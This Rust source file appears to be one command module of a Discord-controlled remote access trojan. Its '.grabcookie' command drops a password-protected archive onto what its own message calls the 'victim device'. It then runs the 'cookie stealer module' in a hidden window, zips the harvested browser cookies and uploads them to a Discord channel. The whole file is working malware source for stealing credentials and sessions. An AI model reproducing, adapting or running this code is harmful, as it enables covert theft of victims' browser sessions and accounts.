use crate::commands::*;
use crate::config::Config;
use anyhow::Result;
use async_trait::async_trait;
use std::env;
use std::fs;
use std::io::{BufReader, Read, Write};
use std::path::{Path, PathBuf};
use std::process::Command;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;
use twilight_model::http::attachment::Attachment;
use walkdir::WalkDir;
use zip::{write::FileOptions, ZipWriter};
use std::os::windows::process::CommandExt;

pub struct GrabCommand;

const MODULE_NAME: &str = "cookie-mod.exe";

impl GrabCommand {
    fn get_module_path() -> Result<PathBuf> {
        let username = env::var("USERNAME")
            .or_else(|_| env::var("USER"))
            .map_err(|_| anyhow::anyhow!("Error..."))?;

        let path = PathBuf::from(format!(r"C:\Users\{}\AppData\Local\Packages\kurinium\modules", username));
        Ok(path)
    }
}

#[async_trait]
impl BotCommand for GrabCommand {
    fn name(&self) -> &str { "grabcookie" }
    fn description(&self) -> &str { "Grab cookie or install cookie-mod.exe module" }
    fn category(&self) -> &str { "filesystem" }
    fn usage(&self) -> &str { ".grabcookie | .grabcookie [password] (with RAR attachment)" }
    fn examples(&self) -> &'static [&'static str] { &[".grabcookie", ".grabcookie mypassword (with attachment)"] }
    fn aliases(&self) -> &'static [&'static str] { &["getmod"] }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, args: Arguments) -> Result<()> {
        if msg.attachments.is_empty() {
            return self.check_module(http, msg).await;
        }

        let password_owned = args.rest();
        let password = password_owned.trim();

        self.install_module(http, msg, password).await
    }
}

impl GrabCommand {
    async fn check_module(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let module_path = Self::get_module_path()?.join(MODULE_NAME);

        if module_path.exists() {
            let status_msg = http.create_message(msg.channel_id).content("Checking for cookie-mod.exe...").await?;
            let status_message = status_msg.model().await?;

            http.update_message(msg.channel_id, status_message.id)
                .content(Some("Running cookie-mod.exe..."))
                .await?;

            let output_dir = Self::get_module_path()?.join("output");
            if output_dir.exists() {
                let _ = fs::remove_dir_all(&output_dir);
            }

            match Self::run_cookie_mod(&module_path) {
                Ok(cmd_output) => {
                    http.update_message(msg.channel_id, status_message.id)
                        .content(Some(&format!(
                            "cookie-mod.exe executed.\nWaiting for output folder..."
                        )))
                        .await?;

                    let max_wait = 30;
                    let mut waited = 0;
                    while !output_dir.exists() && waited < max_wait {
                        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
                        waited += 1;
                    }

                    if !output_dir.exists() {
                        http.update_message(msg.channel_id, status_message.id)
                            .content(Some(&format!("Output folder not generated after {} seconds.\n\n**Command output:**\n```\n{}\n```", max_wait, cmd_output)))
                            .await?;
                        return Ok(());
                    }

                    http.update_message(msg.channel_id, status_message.id)
                        .content(Some("Output folder found. Zipping..."))
                        .await?;

                    let zip_path = Self::get_module_path()?.join("output.zip");
                    if zip_path.exists() {
                        let _ = fs::remove_file(&zip_path);
                    }

                    match Self::zip_directory(&output_dir, &zip_path) {
                        Ok(zip_size) => {
                            let max_size = Config::get_max_bfilesize() as u64;
                            if zip_size > max_size {
                                http.update_message(msg.channel_id, status_message.id)
                                    .content(Some(&format!("Zip file is too large for Discord. Limit: {:.0} MB, Size: {:.2} MB",
                                        Config::MAX_FILE_SIZE_MB,
                                        zip_size as f64 / (1024.0 * 1024.0)
                                    )))
                                    .await?;
                                let _ = fs::remove_file(&zip_path);
                                let _ = fs::remove_dir_all(&output_dir);
                                return Ok(());
                            }

                            http.update_message(msg.channel_id, status_message.id)
                                .content(Some("Uploading output.zip to Discord..."))
                                .await?;

                            match fs::read(&zip_path) {
                                Ok(zip_content) => {
                                    let attachment = Attachment::from_bytes("output.zip".to_string(),
                                        zip_content,
                                        1,
                                    );

                                    match http
                                        .create_message(msg.channel_id)
                                        .content(&format!("**Grabbing cookies completed!**\n**Output size:** {:.2} MB", zip_size as f64 / (1024.0 * 1024.0)))
                                        .attachments(&[attachment])
                                        .await
                                    {
                                        Ok(_) => {
                                            let _ = http.delete_message(msg.channel_id, status_message.id).await;
                                            let _ = fs::remove_file(&zip_path);
                                            let _ = fs::remove_dir_all(&output_dir);
                                        }
                                        Err(e) => {
                                            http.update_message(msg.channel_id, status_message.id)
                                                .content(Some(&format!("Failed to send zip file: {}", e)))
                                                .await?;
                                        }
                                    }
                                }
                                Err(e) => {
                                    http.update_message(msg.channel_id, status_message.id)
                                        .content(Some(&format!("Failed to read zip file: {}", e)))
                                        .await?;
                                }
                            }
                        }
                        Err(e) => {
                            http.update_message(msg.channel_id, status_message.id)
                                .content(Some(&format!("Failed to zip output folder: {}", e)))
                                .await?;
                        }
                    }
                }
                Err(e) => {
                    http.update_message(msg.channel_id, status_message.id)
                        .content(Some(&format!("Failed to run cookie-mod.exe: {}", e)))
                        .await?;
                }
            }
        } else {
            http.create_message(msg.channel_id)
                .content("Heyhey~ It seems like you havent installed the cookie stealer module on the victim device yet.\nPlease download it, compress it into a RAR file with a password, and then use this command:\n.grab <password> (dont forget to upload your RAR file~)\nDownload: https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/tag/v0.16.0")
                .await?;
        }

        Ok(())
    }

    async fn install_module(&self,
        http: &Arc<HttpClient>,
        msg: &Message,
        password: &str,
    ) -> Result<()> {
        let attachment = &msg.attachments[0];

        let extension = Path::new(&attachment.filename)
            .extension()
            .and_then(|e| e.to_str())
            .unwrap_or("");

        if !extension.eq_ignore_ascii_case("rar") {
            http.create_message(msg.channel_id)
                .content(&format!("Attachment must be a RAR file. Got: `{}`", attachment.filename))
                .await?;
            return Ok(());
        }

        let status_msg = http
            .create_message(msg.channel_id)
            .content(&format!("Downloading `{}`...", attachment.filename))
            .await?;
        let status_message = status_msg.model().await?;

        let temp_rar_path = PathBuf::from(std::env::temp_dir()).join(&attachment.filename);

        let client = reqwest::Client::builder()
            .user_agent("Kurinium-Bot/1.0")
            .timeout(std::time::Duration::from_secs(60))
            .build()?;

        match client.get(&attachment.url).send().await {
            Ok(resp) => {
                if !resp.status().is_success() {
                    http.update_message(msg.channel_id, status_message.id)
                        .content(Some(&format!("Failed to download attachment. Server returned status: {}", resp.status())))
                        .await?;
                    return Ok(());
                }

                let bytes = resp.bytes().await?;
                fs::write(&temp_rar_path, &bytes)?;

                http.update_message(msg.channel_id, status_message.id)
                    .content(Some(&format!("Downloaded. Extracting to `{}`...", Self::get_module_path()?.display())))
                    .await?;
                fs::create_dir_all(Self::get_module_path()?)?;

                match Self::extract_rar(&temp_rar_path, &Self::get_module_path()?, password) {
                    Ok((output, tool_used)) => {
                        let _ = fs::remove_file(&temp_rar_path);

                        match Self::find_andrename(&Self::get_module_path()?) {
                            Ok(renamed_from) => {
                                let mut content = format!(
                                    "**Module installed!**\n-# Please run .grabcookie again\n**Extracted with:** `{}`\n**Renamed from:** `{}`\n**Final location:** `{}\\{}`",
                                    tool_used,
                                    renamed_from,
                                    Self::get_module_path()?.display(),
                                    MODULE_NAME
                                );

                                if !output.is_empty() && output.len() < 300 {
                                    content.push_str(&format!(
                                        "\n\n**Extraction output:**\n```\n{}\n```",
                                        output
                                    ));
                                }

                                http.update_message(msg.channel_id, status_message.id)
                                    .content(Some(&content))
                                    .await?;
                            }
                            Err(e) => {
                                http.update_message(msg.channel_id, status_message.id)
                                    .content(Some(&format!(
                                        "Extraction succeeded but failed to rename to `{}`: {}",
                                        MODULE_NAME, e
                                    )))
                                    .await?;
                            }
                        }
                    }
                    Err(e) => {
                        let _ = fs::remove_file(&temp_rar_path);

                        http.update_message(msg.channel_id, status_message.id)
                            .content(Some(&format!("Failed to extract archive: {}", e)))
                            .await?;
                    }
                }
            }
            Err(e) => {
                http.update_message(msg.channel_id, status_message.id)
                    .content(Some(&format!("Failed to download attachment: {}", e)))
                    .await?;
            }
        }

        Ok(())
    }

    fn find_andrename(module_dir: &Path) -> Result<String> {
        let target_path = module_dir.join(MODULE_NAME);

        if target_path.exists() {
            return Ok(MODULE_NAME.to_string());
        }

        let mut found_exe: Option<PathBuf> = None;

        for entry in fs::read_dir(module_dir)? {
            let entry = entry?;
            let path = entry.path();

            if path.is_file() {
                if let Some(ext) = path.extension() {
                    if ext.eq_ignore_ascii_case("exe") {
                        found_exe = Some(path);
                        break;
                    }
                }
            } else if path.is_dir() {
                for sub_entry in fs::read_dir(&path)? {
                    let sub_entry = sub_entry?;
                    let sub_path = sub_entry.path();

                    if sub_path.is_file() {
                        if let Some(ext) = sub_path.extension() {
                            if ext.eq_ignore_ascii_case("exe") {
                                found_exe = Some(sub_path);
                                break;
                            }
                        }
                    }
                }
                if found_exe.is_some() { break; }
            }
        }

        if let Some(exe_path) = found_exe {
            let original_name = exe_path
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("unknown")
                .to_string();

            fs::rename(&exe_path, &target_path)?;

            Ok(original_name)
        } else {
            Err(anyhow::anyhow!("No .exe file found in extracted archive"))
        }
    }

    fn run_cookie_mod(module_path: &Path) -> Result<String> {
        const CREATE_NO_WINDOW: u32 = 0x08000000;

        let current_dir = module_path.parent()
            .map(|p| p.to_path_buf())
            .or_else(|| Self::get_module_path().ok())
            .unwrap_or_else(|| PathBuf::from("."));

        let mut cmd = Command::new(module_path);
        cmd.arg("all")
            .current_dir(&current_dir)
            .creation_flags(CREATE_NO_WINDOW);

        let output = cmd.output()?;
        let stdout = String::from_utf8_lossy(&output.stdout).to_string();
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();

        if output.status.success() {
            Ok(format!("{}\n{}", stdout, stderr))
        } else {
            Err(anyhow::anyhow!("Command failed: {}\n{}", stdout, stderr))
        }
    }

    const BUFFER_SIZE: usize = 64 * 1024;

    fn zip_directory(dir_path: &Path, output_path: &Path) -> Result<u64> {
        let file = fs::File::create(output_path)?;
        let mut zip = ZipWriter::new(file);

        let base_dir_name = dir_path
            .file_name()
            .ok_or_else(|| anyhow::anyhow!("Invalid directory name"))?
            .to_string_lossy();

        for entry in WalkDir::new(dir_path).into_iter().filter_map(|e| e.ok()) {
            let path = entry.path();
            let relative_path = path.strip_prefix(dir_path)?;

            if path.is_file() {
                let zip_path = Path::new(base_dir_name.as_ref()).join(relative_path);
                let zip_path_str = zip_path.to_string_lossy().replace('\\', "/");

                let options = FileOptions::default()
                    .compression_method(zip::CompressionMethod::Stored)
                    .unix_permissions(0o644);

                zip.start_file(&zip_path_str, options)?;

                let mut reader = BufReader::new(fs::File::open(path)?);
                let mut buffer = [0; Self::BUFFER_SIZE];

                loop {
                    let bytes_read = reader.read(&mut buffer)?;
                    if bytes_read == 0 {
                        break;
                    }
                    zip.write_all(&buffer[..bytes_read])?;
                }
            } else if path.is_dir() && relative_path != Path::new("") {
                let zip_path = Path::new(base_dir_name.as_ref()).join(relative_path);
                let zip_path_str = format!("{}/", zip_path.to_string_lossy().replace('\\', "/"));

                let options = FileOptions::default()
                    .compression_method(zip::CompressionMethod::Stored)
                    .unix_permissions(0o755);

                zip.add_directory(&zip_path_str, options)?;
            }
        }

        zip.finish()?;

        Ok(fs::metadata(output_path)?.len())
    }

    #[cfg(windows)]
    fn extract_rar(
        rar_path: &Path,
        destination: &Path,
        password: &str,
    ) -> Result<(String, String)> {
        const CREATE_NO_WINDOW: u32 = 0x08000000;

        let unrar_paths = vec![
            ("unrar", false),
            ("C:\\Program Files\\WinRAR\\UnRAR.exe", true),
            ("C:\\Program Files\\WinRAR\\WinRAR.exe", true),
            ("C:\\Program Files (x86)\\WinRAR\\UnRAR.exe", true),
            ("C:\\Program Files (x86)\\WinRAR\\WinRAR.exe", true),
        ];

        let mut last_error = None;

        for (unrar_exe, check_exists) in unrar_paths {
            if check_exists && !Path::new(unrar_exe).exists() {
                continue;
            }

            let mut cmd = Command::new(unrar_exe);
            cmd.arg("x").arg("-y").arg("-o+");

            if !password.is_empty() {
                cmd.arg(format!("-p{}", password));
            } else {
                cmd.arg("-p-");
            }

            let dest_str = format!("{}\\", destination.display());

            cmd.arg(rar_path)
                .arg(&dest_str)
                .creation_flags(CREATE_NO_WINDOW);

            match cmd.output() {
                Ok(output) => {
                    if output.status.success() {
                        let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                        return Ok((stdout, unrar_exe.to_string()));
                    } else {
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        let stdout = String::from_utf8_lossy(&output.stdout);

                        if stderr.contains("password") || stdout.contains("password") {
                            return Err(anyhow::anyhow!("Archive is encrypted. Please provide password."));
                        }

                        last_error = Some(anyhow::anyhow!("Extraction failed: {} {}", stdout, stderr));
                    }
                }
                Err(e) => {
                    last_error = Some(anyhow::anyhow!("Failed to run {}: {}", unrar_exe, e));
                    continue;
                }
            }
        }

        Err(last_error.unwrap_or_else(|| {
            anyhow::anyhow!("WinRAR or unrar not found.")
        }))
    }
}
